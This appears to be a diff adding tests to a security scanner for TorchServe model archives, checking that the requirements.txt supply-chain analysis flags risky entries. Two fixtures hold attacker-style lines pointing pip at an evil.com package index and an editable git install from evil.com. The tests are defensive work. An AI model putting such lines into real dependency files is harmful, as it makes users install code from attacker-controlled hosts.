@@ -435,3 +435,87 @@ def test_core_mar_fallback_rejects_boolean_size_limit_config(tmp_path: Path) -> 
     handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")
     assert result.scanner_name == "zip"
     assert len(handler_failures) == 0
+
+
+def test_scan_flags_non_pypi_requirements_index_as_critical(tmp_path: Path) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries={
+            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
+            "weights.bin": b"weights",
+            "requirements.txt": b"--index-url http://evil.com/simple\nnumpy==1.26.4\n",
+        },
+        filename="requirements_evil_index.mar",
+    )
+
+    result = TorchServeMarScanner().scan(str(mar_path))
+    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
+
+    assert len(requirements_failures) == 1
+    assert requirements_failures[0].severity == IssueSeverity.CRITICAL
+    assert any(
+        finding["reason"] == "non_pypi_index_url" for finding in requirements_failures[0].details.get("findings", [])
+    )
+
+
+def test_scan_flags_editable_git_requirements_as_warning(tmp_path: Path) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries={
+            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
+            "weights.bin": b"weights",
+            "requirements.txt": b"-e git+https://evil.com/repo#egg=evilpkg\n",
+        },
+        filename="requirements_editable_git.mar",
+    )
+
+    result = TorchServeMarScanner().scan(str(mar_path))
+    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
+
+    assert len(requirements_failures) == 1
+    assert requirements_failures[0].severity == IssueSeverity.WARNING
+    reasons = {finding["reason"] for finding in requirements_failures[0].details.get("findings", [])}
+    assert "editable_install" in reasons
+    assert "git_install" in reasons
+
+
+def test_scan_accepts_clean_requirements_txt(tmp_path: Path) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries={
+            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
+            "weights.bin": b"weights",
+            "requirements.txt": b"numpy==1.26.4\ntorch==2.2.2\n",
+        },
+        filename="requirements_clean.mar",
+    )
+
+    result = TorchServeMarScanner().scan(str(mar_path))
+    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
+
+    assert len(requirements_failures) == 0
+
+
+def test_scan_without_requirements_txt_preserves_existing_behavior(tmp_path: Path) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries={
+            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
+            "weights.bin": b"weights",
+        },
+        filename="requirements_missing.mar",
+    )
+
+    result = TorchServeMarScanner().scan(str(mar_path))
+    requirements_checks = [
+        check for check in result.checks if check.name == "TorchServe Requirements Supply Chain Analysis"
+    ]
+    assert requirements_checks == []
